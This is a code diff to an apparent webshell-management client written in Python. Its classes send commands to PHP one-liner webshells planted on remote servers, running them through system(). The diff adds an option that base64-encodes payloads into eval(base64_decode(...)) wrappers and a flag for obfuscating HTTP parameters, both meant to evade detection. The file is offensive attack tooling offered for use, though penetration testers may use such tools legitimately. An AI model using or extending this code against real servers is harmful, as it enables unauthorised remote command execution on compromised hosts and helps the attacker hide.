@@ -3,6 +3,8 @@ import logging
 import random
 import string
 import httpx
+import base64
+from dataclasses import dataclass
 from .base import Session
 
 logger = logging.getLogger("sessions.php")
@@ -15,7 +17,27 @@ echo '{delimiter_stop}';"""
 __all__ = ["PHPWebshellMixin", "PHPWebshellOneliner"]
 
 
+@dataclass
+class PHPWebshellOptions:
+    """除了submit_raw之外的函数需要的各类选项"""
+
+    encoder: t.Literal["raw", "base64"] = "raw"
+    http_params_obfs: bool = False
+
+
 class PHPWebshellMixin:
+    def __init__(self, options: t.Union[None, PHPWebshellOptions]):
+        self.options = options if options else PHPWebshellOptions()
+
+    def encode(self, payload: str) -> str:
+        if self.options.encoder == "raw":
+            return payload
+        elif self.options.encoder == "base64":
+            encoded = base64.b64encode(payload.encode()).decode()
+            return f"eval(base64_decode(\"{encoded}\"));"
+        else:
+            raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")
+
     async def execute_cmd(self, cmd: str) -> t.Union[str, None]:
         return await self.submit(f"system({cmd!r});")
 
@@ -28,6 +50,7 @@ class PHPWebshellMixin:
         return result is not None and (first_string + second_string) in result
 
     async def submit(self, payload: str) -> t.Union[str, None]:
+
         start, stop = (
             "".join(random.choices(string.ascii_lowercase, k=6)),
             "".join(random.choices(string.ascii_lowercase, k=6)),
@@ -38,6 +61,7 @@ class PHPWebshellMixin:
             delimiter_stop=stop,
             payload_raw=payload,
         )
+        payload = self.encode(payload)
         result = await self.submit_raw(payload)
         if result is None:
             return None
@@ -86,8 +110,9 @@ class PHPWebshellOneliner(PHPWebshellMixin, Session):
         password: str,
         params: t.Union[t.Dict, None] = None,
         data: t.Union[t.Dict, None] = None,
+        options: t.Union[PHPWebshellOptions, None] = None,
     ) -> None:
-        super().__init__()
+        PHPWebshellMixin.__init__(self, options)
         self.method = method.upper()
         self.url = url
         self.password = password
@@ -107,5 +132,6 @@ class PHPWebshellOneliner(PHPWebshellMixin, Session):
                     method=self.method, url=self.url, params=params, data=data
                 )
                 return response.status_code, response.text
+
         except httpx.HTTPError:
             return None
